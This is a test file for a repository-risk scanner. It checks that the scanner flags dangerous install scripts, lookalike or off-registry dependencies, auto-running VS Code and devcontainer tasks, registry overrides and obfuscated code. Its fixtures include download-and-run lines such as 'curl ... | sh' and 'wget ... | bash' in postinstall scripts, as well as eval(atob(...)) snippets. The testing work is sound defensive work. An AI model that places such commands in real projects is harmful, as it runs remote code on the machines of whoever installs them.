import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { assessRepository } from '../src/index.ts';
import type { RiskReport } from '../src/index.ts';

const pkg = (value: object) => JSON.stringify(value, null, 2);
const file = (path: string, content: string) => ({ path, content });
const ids = (report: RiskReport) => report.signals.map((signal) => signal.id);
const find = (report: RiskReport, id: string) => report.signals.find((signal) => signal.id === id);

describe('assessRepository: install scripts', () => {
  it('finds nothing alarming in an ordinary project', () => {
    const report = assessRepository({
      files: [
        file('package.json', pkg({ scripts: { build: 'vite build', test: 'vitest', prepare: 'husky' }, dependencies: { react: '^18.2.0', zod: '^3.22.0' } })),
        file('src/index.tsx', "import React from 'react';\nexport const App = () => null;\n"),
        file('vite.config.ts', "import { defineConfig } from 'vite';\nexport default defineConfig({});\n"),
      ],
    });
    assert.deepEqual(ids(report), ['lifecycle-script']);
    assert.equal(report.highest, 'info');
    assert.equal(report.checkedDependencies, 2);
    assert.equal(report.scannedFiles, 3);
    assert.ok(report.limitations.some((text) => /does not mean a repository is safe/.test(text)));
  });

  it('reports "none" when there is nothing to say', () => {
    const report = assessRepository({ files: [file('package.json', pkg({ scripts: { build: 'vite build' } }))] });
    assert.equal(report.highest, 'none');
    assert.deepEqual(report.signals, []);
  });

  it('flags a postinstall that downloads and runs code', () => {
    const text = pkg({ name: 'x', scripts: { postinstall: 'curl -s https://example.test/a.sh | sh' } });
    const report = assessRepository({ files: [file('package.json', text)] });
    const signal = find(report, 'script-download-exec');
    assert.equal(signal?.severity, 'high');
    assert.equal(signal?.file, 'package.json');
    assert.equal(signal?.line, 4);
    assert.match(signal?.title ?? '', /"postinstall"/);
    assert.match(signal?.detail ?? '', /automatically when you install/);
    assert.equal(report.highest, 'high');
    assert.equal(find(report, 'lifecycle-script'), undefined);
  });

  it('follows npm run to the script it starts', () => {
    const report = assessRepository({
      files: [file('package.json', pkg({ scripts: { postinstall: 'npm run setup', setup: 'wget -qO- http://203.0.113.7/x | bash' } }))],
    });
    const signals = report.signals.filter((signal) => signal.id === 'script-download-exec');
    assert.ok(signals.some((signal) => /"postinstall"/.test(signal.title) && signal.severity === 'high'));
  });

  it('is less alarmed by scripts you have to start yourself', () => {
    const report = assessRepository({ files: [file('package.json', pkg({ scripts: { start: 'curl -s https://example.test/a.sh | sh' } }))] });
    const signal = find(report, 'script-download-exec');
    assert.equal(signal?.severity, 'medium');
    assert.match(signal?.title ?? '', /"start"/);
    assert.equal(signal?.detail.includes('automatically'), false);
  });

  it('reads the file that an install script runs', () => {
    const obfuscated = Array.from({ length: 6 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)} = [];`).join('\n');
    const report = assessRepository({
      files: [
        file('package.json', pkg({ scripts: { postinstall: 'node scripts/setup.js' } })),
        file('scripts/setup.js', `${obfuscated}\nconst cp = require('child_process');\ncp.execSync('whoami');\n`),
      ],
    });
    assert.equal(find(report, 'code-obfuscated')?.severity, 'high');
    assert.equal(find(report, 'code-child-process')?.file, 'scripts/setup.js');
    assert.match(find(report, 'code-child-process')?.title ?? '', /runs from "postinstall"/);
  });

  it('treats an install script that uses the network and starts programs as high risk', () => {
    const both = assessRepository({
      files: [
        file('package.json', pkg({ scripts: { postinstall: 'node scripts/setup.js' } })),
        file('scripts/setup.js', "const cp = require('child_process');\nconst https = require('https');\ncp.execSync('whoami');\n"),
      ],
    });
    assert.equal(find(both, 'code-network-exec')?.severity, 'high');
    assert.equal(find(both, 'code-network-exec')?.file, 'scripts/setup.js');
    const onlyOne = assessRepository({
      files: [file('package.json', pkg({ scripts: { postinstall: 'node scripts/setup.js' } })), file('scripts/setup.js', "const cp = require('child_process');\ncp.execSync('whoami');\n")],
    });
    assert.equal(find(onlyOne, 'code-network-exec'), undefined);
    const notInstall = assessRepository({
      files: [file('package.json', pkg({ scripts: { build: 'node scripts/setup.js' } })), file('scripts/setup.js', "const cp = require('child_process');\nconst https = require('https');\n")],
    });
    assert.equal(find(notInstall, 'code-network-exec'), undefined);
  });

  it('resolves script paths relative to a nested package.json', () => {
    const report = assessRepository({
      files: [
        file('packages/web/package.json', pkg({ scripts: { postinstall: 'node ./setup.js' } })),
        file('packages/web/setup.js', "eval(atob('YQ=='));"),
      ],
    });
    assert.equal(find(report, 'code-decode-eval')?.file, 'packages/web/setup.js');
  });

  it('flags an install script that runs a file which is not in the repository', () => {
    const report = assessRepository({ files: [file('package.json', pkg({ scripts: { postinstall: 'node install/real.js' } }))] });
    const signal = find(report, 'script-missing-file');
    assert.equal(signal?.severity, 'medium');
    assert.equal(signal?.subject, 'install/real.js');
  });

  it('ignores script paths that leave the repository or live in ignored folders', () => {
    const report = assessRepository({
      files: [file('package.json', pkg({ scripts: { postinstall: 'node ../../outside.js && node node_modules/x/setup.js' } }))],
    });
    assert.equal(find(report, 'script-missing-file'), undefined);
  });
});

describe('assessRepository: dependencies', () => {
  const run = (dependencies: Record<string, string>) => assessRepository({ files: [file('package.json', pkg({ dependencies }))] });

  it('flags dependencies from outside the registry', () => {
    const report = run({
      a: 'git+https://example.test/team/a.git',
      b: 'https://cdn.example.test/b.tgz',
      c: 'http://203.0.113.7/c.tgz',
      d: 'github:octo/d',
      e: 'octo/e#main',
      f: 'file:../f',
      g: '^1.0.0',
    });
    const bySubject = new Map(report.signals.filter((signal) => signal.id === 'non-registry-dependency').map((signal) => [signal.subject, signal.severity]));
    assert.deepEqual([...bySubject].sort(), [['a', 'medium'], ['b', 'medium'], ['c', 'high'], ['d', 'low'], ['e', 'low']]);
  });

  it('flags names that look like popular packages', () => {
    const report = run({ crossenv: '^1.0.0', lodahs: '^1.0.0', react: '^18.0.0' });
    const lookalikes = report.signals.filter((signal) => signal.id === 'dependency-lookalike');
    assert.deepEqual(lookalikes.map((signal) => [signal.subject, signal.severity]).sort(), [['crossenv', 'medium'], ['lodahs', 'low']]);
    assert.match(lookalikes[0]?.title ?? '', /looks like the popular package/);
  });

  it('flags a popular name that installs something else', () => {
    const report = run({ react: 'npm:totally-different@1.0.0', lodash: 'npm:lodash@^4.0.0' });
    const aliases = report.signals.filter((signal) => signal.id === 'dependency-alias');
    assert.deepEqual(aliases.map((signal) => signal.subject), ['react']);
  });

  it('counts the dependencies it checked and ignores invalid names', () => {
    const report = run({ react: '^18.0.0', 'bad name!': '1.0.0', zod: '^3.0.0' });
    assert.equal(report.checkedDependencies, 2);
  });
});

describe('assessRepository: files that run without being asked', () => {
  it('flags a VS Code task that runs on folder open, even in a file with comments', () => {
    const tasks = `{
      // Runs when the folder is opened
      "version": "2.0.0",
      "tasks": [
        {
          "label": "setup",
          "type": "shell",
          "command": "node .vscode/loader.js",
          "runOptions": { "runOn": "folderOpen" },
        },
      ],
    }`;
    const report = assessRepository({ files: [file('.vscode/tasks.json', tasks)] });
    assert.equal(find(report, 'vscode-auto-task')?.severity, 'high');
    assert.equal(find(report, 'vscode-auto-task')?.line, 9);
    assert.ok(ids(report).includes('script-hidden-file'));
    assert.ok(report.signals.every((signal) => signal.file === '.vscode/tasks.json'));
  });

  it('does not flag ordinary VS Code tasks', () => {
    const tasks = '{ "version": "2.0.0", "tasks": [{ "label": "build", "type": "shell", "command": "npm run build" }] }';
    assert.deepEqual(assessRepository({ files: [file('.vscode/tasks.json', tasks)] }).signals, []);
  });

  it('flags the setting that allows automatic tasks', () => {
    const report = assessRepository({ files: [file('.vscode/settings.json', '{ "task.allowAutomaticTasks": "on" }')] });
    assert.equal(find(report, 'vscode-allow-auto-tasks')?.severity, 'medium');
  });

  it('flags dev container commands, more for ones that run on your own machine', () => {
    const config = '{ "initializeCommand": "echo hello", "postCreateCommand": "curl -s https://example.test/x.sh | sh", "postStartCommand": ["npm", "install"] }';
    const report = assessRepository({ files: [file('.devcontainer/devcontainer.json', config)] });
    const commands = report.signals.filter((signal) => signal.id === 'devcontainer-command');
    assert.deepEqual(commands.map((signal) => [signal.title, signal.severity]).sort(), [
      ['devcontainer initializeCommand', 'medium'],
      ['devcontainer postStartCommand', 'low'],
    ]);
    assert.equal(find(report, 'script-download-exec')?.severity, 'high');
  });

  it('flags a different registry and hides committed credentials', () => {
    const npmrc = 'registry=https://packages.example.test/\n@team:registry=https://registry.npmjs.org/\n//packages.example.test/:_authToken=npm_SECRET_TOKEN_VALUE\n# comment\n';
    const report = assessRepository({ files: [file('.npmrc', npmrc)] });
    assert.equal(find(report, 'npmrc-registry')?.severity, 'medium');
    assert.equal(find(report, 'npmrc-registry')?.line, 1);
    assert.equal(report.signals.filter((signal) => signal.id === 'npmrc-registry').length, 1);
    const token = find(report, 'npmrc-token');
    assert.equal(token?.excerpt, '//packages.example.test/:_authToken=<hidden>');
    assert.equal(JSON.stringify(report).includes('SECRET_TOKEN_VALUE'), false);
  });

  it('does not flag an npmrc that reads its token from the environment', () => {
    const report = assessRepository({ files: [file('.npmrc', '//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n')] });
    assert.equal(find(report, 'npmrc-token'), undefined);
  });

  it('treats a pinned Yarn release as normal and anything else as suspicious', () => {
    const normal = assessRepository({ files: [file('.yarnrc.yml', 'yarnPath: .yarn/releases/yarn-3.6.0.cjs\n')] });
    assert.equal(find(normal, 'yarn-path')?.severity, 'info');
    const odd = assessRepository({ files: [file('.yarnrc.yml', 'yarnPath: tools/yarn.js\nnpmRegistryServer: "https://packages.example.test"\nplugins:\n  - spec: "https://example.test/plugin.js"\n')] });
    assert.equal(find(odd, 'yarn-path')?.severity, 'medium');
    assert.ok(ids(odd).includes('npmrc-registry'));
    assert.ok(ids(odd).includes('yarn-plugin-url'));
  });
});

describe('assessRepository: lockfiles, code and file names', () => {
  it('flags lockfile entries that point away from the npm registry', () => {
    const lock = JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': {},
        'node_modules/ok': { resolved: 'https://registry.npmjs.org/ok/-/ok-1.0.0.tgz' },
        'node_modules/gh': { resolved: 'git+ssh://git@github.com/o/r.git' },
        'node_modules/mirror': { resolved: 'https://packages.example.test/mirror-1.0.0.tgz' },
        'node_modules/mirror2': { resolved: 'https://packages.example.test/mirror2-1.0.0.tgz' },
        'node_modules/bad': { resolved: 'http://203.0.113.7/bad-1.0.0.tgz' },
      },
    });
    const report = assessRepository({ files: [file('package-lock.json', lock)] });
    const hosts = report.signals.filter((signal) => signal.id === 'lockfile-host');
    assert.deepEqual(hosts.map((signal) => [signal.subject, signal.severity]).sort(), [['203.0.113.7', 'high'], ['packages.example.test', 'medium']]);
    assert.match(hosts.find((signal) => signal.subject === 'packages.example.test')?.title ?? '', /2 packages/);
  });

  it('scans source files for the clearest warning signs', () => {
    const report = assessRepository({
      files: [file('src/app.js', "eval(atob('YWxlcnQoMSk='));"), file('src/clean.js', 'module.exports = 1;')],
    });
    assert.equal(find(report, 'code-decode-eval')?.file, 'src/app.js');
    assert.equal(report.signals.filter((signal) => signal.file === 'src/clean.js').length, 0);
  });

  it('skips tests, docs and fixtures for general scanning', () => {
    const report = assessRepository({
      files: [file('tests/a.test.js', "eval(atob('YQ=='));"), file('docs/example.js', "eval(atob('YQ=='));"), file('src/a.spec.ts', "eval(atob('YQ=='));")],
    });
    assert.deepEqual(report.signals, []);
  });

  it('scans build and tool config files as code that runs', () => {
    const report = assessRepository({
      files: [file('next.config.js', "const cp = require('child_process');\ncp.execSync('curl http://x');\n"), file('src/util.js', "const cp = require('child_process');\n")],
    });
    assert.equal(find(report, 'code-child-process')?.file, 'next.config.js');
    assert.equal(report.signals.filter((signal) => signal.file === 'src/util.js').length, 0);
  });

  it('reads shell scripts that an install script runs', () => {
    const report = assessRepository({
      files: [
        file('package.json', pkg({ scripts: { postinstall: 'sh setup.sh' } })),
        file('setup.sh', '#!/bin/sh\n# comment\ncurl -s https://example.test/x | sh\n'),
        file('other.sh', 'curl -s https://example.test/x | sh\n'),
      ],
    });
    const signals = report.signals.filter((signal) => signal.id === 'script-download-exec');
    assert.equal(signals.find((signal) => signal.file === 'setup.sh')?.severity, 'high');
    assert.equal(signals.find((signal) => signal.file === 'setup.sh')?.line, 3);
    assert.equal(signals.find((signal) => signal.file === 'other.sh')?.severity, 'medium');
  });

  it('notices committed node_modules and program files by name', () => {
    const report = assessRepository({
      files: [file('package.json', '{}')],
      names: ['repo/node_modules/x/index.js', 'repo/bin/setup.exe', 'repo/tools/run.bat', 'repo/dist/old.exe', 'repo/a.png'],
    });
    assert.equal(find(report, 'committed-node-modules')?.severity, 'medium');
    const binaries = report.signals.filter((signal) => signal.id === 'binary-file');
    assert.deepEqual(binaries.map((signal) => [signal.subject, signal.severity]).sort(), [['bat', 'low'], ['exe', 'medium']]);
    assert.equal(binaries.find((signal) => signal.subject === 'exe')?.excerpt, 'repo/bin/setup.exe');
  });

  it('ignores files inside ignored folders', () => {
    const report = assessRepository({
      files: [file('node_modules/x/package.json', pkg({ scripts: { postinstall: 'curl x | sh' } })), file('dist/a.js', "eval(atob('YQ=='));")],
    });
    assert.deepEqual(report.signals, []);
    assert.equal(report.scannedFiles, 0);
  });
});

describe('assessRepository: robustness and limits', () => {
  it('ignores invalid JSON files', () => {
    const report = assessRepository({ files: [file('package.json', '{ not json'), file('package-lock.json', '[[['), file('.vscode/tasks.json', '%%%'), file('.devcontainer.json', 'x')] });
    assert.deepEqual(report.signals, []);
  });

  it('sorts the most serious signals first', () => {
    const report = assessRepository({
      files: [file('package.json', pkg({ scripts: { prepare: 'husky', postinstall: 'curl x | sh' }, dependencies: { lodahs: '1.0.0' } }))],
    });
    const severities = report.signals.map((signal) => signal.severity);
    assert.equal(severities[0], 'high');
    assert.deepEqual(severities, [...severities].sort((a, b) => ['info', 'low', 'medium', 'high'].indexOf(b) - ['info', 'low', 'medium', 'high'].indexOf(a)));
    assert.equal(report.highest, 'high');
  });

  it('limits the number of signals and the number of files', () => {
    const many = Object.fromEntries(Array.from({ length: 30 }, (_, i) => [`crossenv${i}`, 'git+https://example.test/x.git']));
    const limited = assessRepository({ files: [file('package.json', pkg({ dependencies: many }))] }, { maxSignals: 5 });
    assert.equal(limited.signals.length, 5);
    assert.equal(limited.truncated, true);
    assert.ok(limited.limitations.some((text) => /too large to check completely/.test(text)));

    const files = Array.from({ length: 20 }, (_, i) => file(`src/f${i}.js`, 'x'));
    const byFiles = assessRepository({ files }, { maxFiles: 5 });
    assert.equal(byFiles.scannedFiles, 5);
    assert.equal(byFiles.truncated, true);
  });

  it('skips files that are too large and says so', () => {
    const report = assessRepository({ files: [file('src/big.js', 'x'.repeat(500))] }, { maxFileChars: 100 });
    assert.equal(report.scannedFiles, 0);
    assert.ok(report.limitations.some((text) => /1 file was too large to read/.test(text)));
  });

  it('handles Windows-style paths', () => {
    const report = assessRepository({ files: [file('.vscode\\tasks.json', '{ "tasks": [{ "command": "x", "runOptions": { "runOn": "folderOpen" } }] }')] });
    assert.equal(find(report, 'vscode-auto-task')?.file, '.vscode/tasks.json');
  });

  it('only checks the first package.json files in huge monorepos', () => {
    const files = Array.from({ length: 30 }, (_, i) => file(`packages/p${String(i).padStart(2, '0')}/package.json`, pkg({ dependencies: { lodahs: '1.0.0' } })));
    const report = assessRepository({ files });
    assert.equal(report.checkedDependencies, 25);
    assert.ok(report.limitations.some((text) => /first 25 package\.json/.test(text)));
  });

  it('is deterministic', () => {
    const files = [file('package.json', pkg({ scripts: { postinstall: 'curl x | sh' } })), file('a.js', "eval(atob('YQ=='));")];
    assert.deepEqual(assessRepository({ files }), assessRepository({ files: [...files].reverse() }));
  });
});
